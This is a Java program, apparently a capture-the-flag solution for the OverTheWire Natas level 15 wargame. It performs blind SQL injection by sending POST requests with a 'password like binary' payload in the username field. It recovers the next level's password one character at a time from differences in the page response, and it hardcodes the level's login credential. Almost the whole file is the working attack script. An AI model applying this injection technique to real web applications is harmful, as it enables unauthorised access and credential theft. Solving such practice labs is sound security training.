package natas;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Base64;

public class Natas {

	static String caracteres = "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789";

	public static void main(String[] args) throws Exception {

		StringBuilder password = new StringBuilder();
		int longueurInit = -1;

		while (longueurInit != password.length()) {
			longueurInit = password.length();
			for (char charac : caracteres.toCharArray()) {
				if (envoyerRequete(password.toString() + charac)) {
					password.append(charac);
					break;
				}
			}
			System.out.println(password.toString());
		}

		System.out.println(password.toString());
	}

	static boolean envoyerRequete(String param) throws IOException {

		HttpURLConnection connection = null;
		Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("", 0));
		URL url = new URL("http://natas15.natas.labs.overthewire.org/index.php?debug");
		connection = (HttpURLConnection) url.openConnection(proxy);
		connection.setRequestMethod("POST");
		connection.setRequestProperty("Authorization",
				"Basic " + Base64.getEncoder().encodeToString("natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J".getBytes()));

		// We send a content
		connection.setDoOutput(true);

		// Send request
		DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
		wr.writeBytes("username=natas16\" and password like binary \"" + param + "%\" #");
		wr.close();

		// Get Response
		InputStream is = connection.getInputStream();
		BufferedReader rd = new BufferedReader(new InputStreamReader(is));
		StringBuilder response = new StringBuilder();
		String line;
		while ((line = rd.readLine()) != null) {
			response.append(line);
			response.append('\r');
		}

		rd.close();
		return !response.toString().contains("This user doesn't exist");
	}

}
